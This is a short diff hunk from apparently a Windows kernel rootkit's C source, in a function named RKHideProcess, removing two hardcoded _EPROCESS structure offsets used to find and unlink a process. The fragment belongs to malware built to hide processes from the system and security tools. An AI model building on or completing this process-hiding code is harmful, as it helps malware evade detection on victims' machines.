@@ -212,9 +212,6 @@ NTSTATUS RKHideProcess(
 	UINT32 currentProcessId = 0, savedProcessId;
 	int counter = 0;
 
-	// some static offsets..
-	static UINT64 UniqueProcessIdOffset = 0x1d0;
-	static UINT64 ActiveProcessLinksOffset = 0x1d8;
 	
 	// first thing first, let's get our process _EPROCESS address..
 	eprocess = (UINT64) PsGetCurrentProcess();
